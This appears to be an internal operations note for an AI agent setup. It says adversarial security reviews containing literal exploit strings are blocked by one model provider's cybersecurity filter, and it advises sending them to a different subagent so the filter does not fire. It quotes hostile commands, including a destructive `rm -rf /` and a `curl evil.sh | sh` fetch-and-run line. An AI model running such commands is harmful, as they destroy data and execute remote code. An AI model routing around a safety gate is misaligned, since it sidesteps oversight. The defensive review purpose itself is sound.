ops.title: codex adversarial security reviews with literal exploit strings hard-fail on an OpenAI cyber-content gate; escalate to fable
ops.body:
Routing an adversarial security review to gpt-5.6-sol via the codex lane (the Models-table default for security review/audit) HARD-FAILS when the payload carries literal exploit strings — `rm -rf /`, `ext::sh -c "…"`, `curl evil.sh | sh`, homoglyph/injection cases. Codex's backend returns `ERROR: This content was flagged for possible cybersecurity risk … Trusted Access for Cyber` on its first tool calls, burns tokens, and writes a 0-byte reply. It is not transient — the account isn't provisioned past that gate.

**Why:** the codex-wrapper faithfully passes the adversarial question through; the safety gate fires on the content, not the intent. A softened payload (inert placeholders like `echo INJECTED`) might clear it, but that weakens the review.

**How to apply:** for adversarial/bypass-hunting security reviews (auto-approval guards, injection surfaces, anything needing literal attack strings), route straight to a fable subagent with an empirical harness (build a throwaway harness against the real parser/target in /tmp, observe True/False) — the house rule already escalates a codex hard-miss to fable. Keep codex for non-adversarial code/diff review and security *audits* phrased without weaponized literals. Related: [[codex-skill-stub-from-schema-wrappers]], [[codex-tmp-reply-files-can-collide]].
